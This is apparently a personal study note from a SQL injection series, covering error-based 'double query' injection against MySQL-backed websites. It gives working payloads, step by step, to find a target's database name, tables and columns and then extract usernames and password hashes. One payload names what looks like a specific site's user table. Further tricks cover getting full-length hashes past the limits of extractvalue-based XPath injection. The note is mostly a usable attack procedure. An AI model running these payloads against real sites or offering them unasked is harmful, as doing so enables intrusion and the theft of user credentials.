# <mark style="background: #FF5582A6;">Prerequisite :</mark> 
[[12-Xpath Injection]]
# <mark style="background: #FF5582A6;">Description :</mark> 

1. Hashed password are <mark style="background: #FF5582A6;">32</mark> characters or <mark style="background: #FF5582A6;">40</mark> characters.
   So if, for example, the password we obtained with [[12-Xpath Injection]], if it has <mark style="background: #FF5582A6;">33</mark> characters, it means, it's incomplete and we have to use : <mark style="background: #FF5582A6;">Double Query</mark> .

2. if nothing is displayed with the first double query command, then we don't have this vulnerability.

3. if double query and [[12-Xpath Injection]] methods, don't work from one of the steps, we will continue with [[2-Sql Injection (Basic)]].
    because [[2-Sql Injection (Basic)]] doesn't limit the number of characters to be printed, of course, if the site has this vulnerability.

4. if we encounter an <mark style="background: #FF5582A6;">Not Acceptable error</mark> in <mark style="background: #FF5582A6;">the first step of the double query</mark> , <mark style="background: #FF5582A6;">there isn't any bypass</mark> for this.

# How To Do :
## Step 1 :
database :

- <mark style="background: #FFB86CA6;">and (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</mark> 

## Step 2 :
table :

- <mark style="background: #FFB86CA6;">and (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</mark> 

## Step 3 :
column :

- <mark style="background: #FFB86CA6;">and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name='user_data' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</mark> 

## Step 4 :
extract information :

- <mark style="background: #FFB86CA6;">and (select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x3a,password) as char),0x7e)) from edgartlb_content.wafm2_users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</mark> 


## <mark style="background: #FF5582A6;">Important Point 1 :</mark> 
the double query method can be print <mark style="background: #FF5582A6;">63</mark> characters, therefore, it can't print <mark style="background: #FF5582A6;">sha512</mark> hashed passwords that are <mark style="background: #FF5582A6;">112 to 128</mark> characters.
to solve this problem, we have the following command :

- <mark style="background: #FFB86CA6;">And(select 1 from(select count(*),concat(0x3a,(select substr(group_concat(username,0x3a,password),1,150) from admin where table_schema like database()),0x3a,floor(rand(0)*2))x from information_schema.tables group by x)z)-- -</mark> 

if we encounter this error : <mark style="background: #FF5582A6;">Subquery returns more than 1 row</mark> 
in the last step of double query, we use the command above.

## <mark style="background: #FF5582A6;">Important Point 2 :</mark> 
In the last step of [[12-Xpath Injection]]
if the password is hashed, it will not be shown in full. because the xpath injection can be print <mark style="background: #FF5582A6;">32 characters</mark> and one character is <mark style="background: #FF5582A6;">0x7e</mark> , so the hashed password in xpath injection is always <mark style="background: #FF5582A6;">incomplete</mark> .
to solve this problem, we type the first code (1), we write down the hashed password that is displayed then we type the second code (2), and we wirte down the second hashed password under the first hashed password (every character is below the character of the first hashed password, we add the additional characters of the lower password to the upper password) and <mark style="background: #FF5582A6;">complete the password</mark> .
(<mark style="background: #FF5582A6;">in second code, we delete the 0x7e</mark> )

1. <mark style="background: #FFB86CA6;">and extractvalue(rand(),concat(0x7e,(select concat(pass) from admin limit 0,1)))--</mark> 

2. <mark style="background: #FFB86CA6;">and extractvalue(rand(),concat((select concat(pass) from admin limit 0,1)))--</mark> 

So if we encounter an error with the second code (2), that is, we got an error by deleting 0x7e, we use double query as follow :

 - <mark style="background: #FF5582A6;">in this situation, we don't start double query steps from the start, because we found the important table and the important columns.</mark> 
 - <mark style="background: #FF5582A6;">at first, we do the first step if the double query to find the version.</mark> 
 - <mark style="background: #FF5582A6;">then we go to the last step of the double query and we write the name of the database that we found before the important table.</mark> 
 - <mark style="background: #FF5582A6;">of course, double query commands can be also be used from the beginning without xpath injection.</mark> 
    <mark style="background: #FF5582A6;">but it's used most of the time that :</mark> we encounter problems by completing the password in [[12-Xpath Injection]] as explained above, or we encounter an forbidden in the second step of [[12-Xpath Injection]] or in the second step in [[12-Xpath Injection]] the website page is completely loaded.